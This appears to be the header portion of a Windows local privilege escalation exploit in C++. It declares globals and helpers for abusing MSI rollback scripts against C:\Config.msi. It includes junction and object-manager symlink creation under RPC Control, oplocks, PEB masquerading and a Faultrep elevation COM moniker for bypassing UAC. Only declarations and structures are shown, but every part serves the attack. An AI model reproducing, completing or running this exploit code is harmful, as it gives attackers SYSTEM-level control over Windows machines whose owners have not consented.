#include <windows.h>
#include <Msi.h>
#include <combaseapi.h>
#include <stdio.h>
#include <Shlwapi.h>
#include <PathCch.h>
#include <AclAPI.h>
#include "resource.h"
#include "FileOplock.h"

#pragma comment(lib, "Msi.lib")
#pragma comment(lib,"RpcRT4.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "PathCch.lib")
#pragma warning(disable:4996)


HMODULE hm = GetModuleHandle(NULL);
HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_RBS1), L"rbs");
DWORD RbsSize = SizeofResource(hm, res);
void* RbsBuff = LoadResource(hm, res);
NTSTATUS retcode;
HANDLE hFile, hthread;
wchar_t object[] = L"Global\\GLOBALROOT\\RPC Control\\1337.ttdconfig";
wchar_t target[] = L"C:\\Config.msi::$INDEX_ALLOCATION";
wchar_t uac[] = L"C:\\windows\\temp\\uac\\";
#define CLSID_Faultrep_Elevation L"Elevation:Administrator!new:{2C256447-3F0D-4CBB-9D12-575BB20CDA0A}"

class __declspec(uuid("f61082c5-ed37-4a0e-a1b1-08ee41314935")) IFaultrepElevatedDataCollection : public IUnknown {
public:
	virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ long long p0, /* Stack Offset: 16 */ long long p1, /* Stack Offset: 24 */ long long p2, /* Stack Offset: 32 */ BSTR p3, /* Stack Offset: 40 */ void** p4, /* Stack Offset: 48 */ long long p5, /* Stack Offset: 56 */ long long p6);
	virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ long long p0, /* Stack Offset: 16 */ long long p1, /* Stack Offset: 24 */ long long p2, /* Stack Offset: 32 */ long long p3, /* Stack Offset: 40 */ long long p4, /* Stack Offset: 48 */ long long p5, /* Stack Offset: 56 */ BSTR p6, /* Stack Offset: 64 */ void** p7, /* Stack Offset: 72 */ long long p8);
	virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ long long p0, /* Stack Offset: 16 */ BSTR p1, /* Stack Offset: 24 */ long long p2, /* Stack Offset: 32 */ long long p3, /* Stack Offset: 40 */ long long* p4, /* Stack Offset: 48 */ long long p5, /* Stack Offset: 56 */ long long* p6, /* Stack Offset: 64 */ BSTR p7, /* Stack Offset: 72 */ void** p8, /* Stack Offset: 80 */ long long p9);
	virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ BSTR p1);
};




BOOL MasqueradePEB();
void load();
VOID Trigger(WCHAR* target);
DWORD WINAPI install(void*);
void cb2();
BOOL Move(HANDLE hFile);
LPWSTR  BuildPath(LPCWSTR path);
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target);
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DeleteJunction(LPCWSTR dir);
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion);
VOID Fail();
typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define FILE_OPEN               0x00000001
#define FILE_CREATE             0x00000002
#define FILE_OPEN_IF                    0x00000003
#define FILE_DIRECTORY_FILE             0x00000001
#define FILE_OPEN_REPARSE_POINT         0x00200000
#define OBJ_INHERIT             			0x00000002L
#define OBJ_PERMANENT           			0x00000010L
#define OBJ_EXCLUSIVE           			0x00000020L
#define OBJ_CASE_INSENSITIVE    			0x00000040L
#define OBJ_OPENIF              			0x00000080L
#define OBJ_OPENLINK            			0x00000100L
#define OBJ_KERNEL_HANDLE       			0x00000200L
#define OBJ_FORCE_ACCESS_CHECK  			0x00000400L
#define OBJ_IGNORE_IMPERSONATED_DEVICEMAP	0x00000800L
#define OBJ_VALID_ATTRIBUTES    			0x00000FF2L

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES,*POBJECT_ATTRIBUTES;
typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
#define InitializeObjectAttributes( p, n, a, r, s ) {    \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
}


typedef struct _PROCESS_BASIC_INFORMATION
{
	LONG ExitStatus;
	PVOID PebBaseAddress;
	ULONG_PTR AffinityMask;
	LONG BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR ParentProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef struct _PEB_LDR_DATA {
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

// Partial PEB
typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
} PEB, * PPEB;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	union
	{
		LIST_ENTRY InInitializationOrderLinks;
		LIST_ENTRY InProgressLinks;
	};
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;
#define STATUS_MORE_ENTRIES 0x00000105
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define IO_REPARSE_TAG_MOUNT_POINT              (0xA0000003L)

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK   IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef NTSYSAPI VOID(NTAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtOpenDirectoryObject)(OUT PHANDLE DirectoryHandle, IN ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtQueryDirectoryObject)(_In_      HANDLE  DirectoryHandle, _Out_opt_ PVOID   Buffer, _In_ ULONG Length, _In_ BOOLEAN ReturnSingleEntry, _In_  BOOLEAN RestartScan, _Inout_   PULONG  Context, _Out_opt_ PULONG  ReturnLength);
typedef NTSYSCALLAPI NTSTATUS(NTAPI* _NtSetInformationFile)(HANDLE   FileHandle,PIO_STATUS_BLOCK  IoStatusBlock,PVOID  FileInformatio,ULONG  Length,ULONG FileInformationClass);
typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(PRTL_CRITICAL_SECTION CriticalSection);
typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(PRTL_CRITICAL_SECTION CriticalSection);
typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(HANDLE ProcessHandle,DWORD ProcessInformationClass,PVOID ProcessInformation,DWORD ProcessInformationLength,PDWORD ReturnLength);

_RtlInitUnicodeString pRtlInitUnicodeString;
_NtCreateFile pNtCreateFile;
_NtSetInformationFile pNtSetInformationFile;
_NtQueryDirectoryObject pNtQueryDirectoryObject;
_NtOpenDirectoryObject pNtOpenDirectoryObect;
_RtlLeaveCriticalSection pRtlLeaveCriticalSection;
_RtlEnterCriticalSection pRtlEnterCriticalSection;
_NtQueryInformationProcess pNtQueryInformationProcess;
